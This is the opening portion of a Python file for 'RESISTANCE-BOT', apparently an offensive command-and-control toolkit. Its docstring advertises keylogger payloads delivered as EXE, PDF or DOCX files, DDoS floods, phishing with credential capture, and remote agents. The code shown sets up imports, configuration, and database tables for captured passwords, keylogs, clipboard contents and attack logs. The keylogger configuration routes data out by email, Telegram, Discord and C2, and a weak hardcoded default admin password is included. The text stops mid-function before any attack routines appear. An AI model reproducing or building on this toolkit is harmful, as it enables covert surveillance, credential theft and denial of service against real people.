#!/usr/bin/env python3
"""
🛡️ RESISTANCE-BOT v1.0.0 - Advanced Cybersecurity Command & Control Platform
Author: Ian Carter Kulani
Version: 1.0.0


A complete cybersecurity automation platform featuring:
- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Google Chat, Slack, iMessage, Web)
- 5000+ Security Commands (Ping, Nmap, Curl, Netcat, SSH, Nikto, Hydra, etc.)
- REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP/SYN/ACK/FIN Floods)
- Advanced Social Engineering Suite with 100+ Phishing Templates
- Spear Phishing Module with Email Tracking
- Keylogger Deployment via EXE, PDF, DOCX, Link, and Network Payloads
- SSH Remote Access via All Platforms
- Advanced IP Management & Threat Detection
- Stunning Blue & White Web Dashboard with Real-time Monitoring
- Keylogger Module (F10 to Start/Stop)
- DDoS/DoS Attack Module with Multiple Attack Vectors
- Network Management & Traffic Monitoring
- Agent Mode for Remote Control with Heartbeat
- Graphical Reports & Statistics (PDF/JSON)
- Payload Generation & Deployment
- IP to Domain Translation & Hosting
- PDF/JSON Report Generation
- Well-Structured Commands with Categories
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import dns.resolver
import dns.reversename
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "RESISTANCE-BOT"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Advanced Cybersecurity Command & Control Platform"
LINES_OF_CODE = 14959

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# Google Chat
try:
    from httplib2 import Http
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, RandIP, fragment
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger (pynput)
try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# DOCX Generation
try:
    from docx import Document
    from docx.shared import Inches, Pt
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

# PyInstaller for EXE generation
PYINSTALLER_AVAILABLE = shutil.which('pyinstaller') is not None

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =====================
# THEME (Blue & White)
# =====================
class Colors:
    PRIMARY = '\033[94m'      # Blue
    SECONDARY = '\033[96m'    # Cyan
    ACCENT = '\033[97m'       # White
    SUCCESS = '\033[92m'      # Green
    WARNING = '\033[93m'      # Yellow
    ERROR = '\033[91m'        # Red
    INFO = '\033[94m'         # Blue
    DARK = '\033[90m'         # Dark Gray
    WHITE = '\033[97m'        # White
    BLUE = '\033[94m'         # Blue
    CYAN = '\033[96m'         # Cyan
    RED = '\033[91m'          # Red
    GREEN = '\033[92m'        # Green
    MAGENTA = '\033[95m'      # Magenta
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BG_BLUE = '\033[44m'
    BG_WHITE = '\033[47m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".resistance_bot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "resistance_bot.db")
LOG_FILE = os.path.join(CONFIG_DIR, "resistance_bot.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "resistance_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
REPORTS_DIR = os.path.join(CONFIG_DIR, "reports")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, REPORTS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - RESISTANCE - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("ResistanceBot")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class Payload:
    id: str
    name: str
    payload_type: str
    file_path: str
    created_at: str
    deployed: bool = False
    deployment_count: int = 0
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",  # pdf, json, both
        "generate_graphics": True,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": False,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": ""
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_duration": 30
        },
        "agent": {
            "enabled": False,
            "server": "localhost",
            "port": 5555,
            "heartbeat": 60
        },
        "payload": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "exe_icon": "",
            "docx_template": "default"
        },
        "reporting": {
            "enabled": True,
            "pdf_enabled": True,
            "json_enabled": True,
            "auto_generate": True
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                report_type TEXT NOT NULL,
                report_path TEXT NOT NULL,
                target TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                deployed BOOLEAN DEFAULT 0,
                deployment_count INTEGER DEFAULT 0,
                callback_host TEXT,
                callback_port INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payload_deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT NOT NULL,
                deployment_type TEXT NOT NULL,
                target TEXT,
                deployed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (payload_id) REFERENCES payloads(id)
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "resistance2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            try:
                import socket
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            return None
        except:
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            try:
